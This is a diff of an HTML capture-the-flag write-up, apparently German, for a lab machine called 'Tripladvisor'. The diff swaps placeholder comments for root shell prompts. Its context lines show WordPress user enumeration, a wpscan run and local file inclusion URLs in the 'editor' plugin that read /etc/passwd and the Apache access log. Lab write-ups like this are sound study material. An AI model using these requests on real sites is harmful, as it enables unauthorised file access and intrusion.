@@ -287,7 +287,7 @@ http://Tripladvisor:8080/Index.html           (Status: 200) [Size: 202]
 
             <div class="code-block">
                 <div class="terminal">
-                    <div class="prompt"> # Kein Prompt im Original, Befehl direkt ausgeführt
+                    <div class="prompt">┌──(root㉿CCat)-[~]
 └─# <span class="command">curl http://tripladvisor:8080/wordpress/wp-json/wp/v2/users</span></div>
                     <pre>
 [
@@ -382,8 +382,8 @@ http://Tripladvisor:8080/Index.html           (Status: 200) [Size: 202]
 
             <div class="code-block">
                  <div class="terminal">
-                     <div class="prompt"> # Kein Prompt im Original, vermutlich Teil der vorherigen WPScan-Ausgabe oder separater Lauf mit -e vp
-└─# <span class="command"># wpscan --url http://Tripladvisor:8080 -e vp (vermuteter Befehl)</span></div>
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command"># wpscan --url http://Tripladvisor:8080 -e vp</span></div>
                      <pre>
 [+] editor
  | Location: http://tripladvisor:8080/wordpress/wp-content/plugins/editor/
@@ -408,7 +408,7 @@ http://Tripladvisor:8080/Index.html           (Status: 200) [Size: 202]
 
             <div class="code-block">
                 <div class="terminal">
-                     <div class="prompt"> # Kein Prompt, Browser-Aktion
+                     <div class="prompt">┌──(root㉿CCat)-[~]
 └─# <span class="command"># Besuch der URL im Browser (view-source)</span></div>
                      <pre>
 view-source:http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
@@ -453,7 +453,7 @@ Requests/sec.: 970.0587
 
             <div class="code-block">
                  <div class="terminal">
-                     <div class="prompt"> # Kein Prompt, Browser-Aktion
+                     <div class="prompt">┌──(root㉿CCat)-[~]
 └─# <span class="command"># Besuch der URL im Browser (view-source)</span></div>
                      <pre>
 view-source:http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=\xampp\apache\logs\access.log
@@ -492,7 +492,7 @@ fe80::58d6:a2ae:50ae:f30e - - [18/Aug/2024:09:58:01 -0700] "POST /wordpress/wp-c
 
              <div class="code-block">
                  <div class="terminal">
-                      <div class="prompt"> # Kein Prompt, Browser-Aktion
+                      <div class="prompt">┌──(root㉿CCat)-[~]
 └─# <span class="command"># Erneuter Besuch der LFI-URL im Browser (view-source)</span></div>
                       <pre>
 view-source:http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=\xampp\apache\logs\access.log
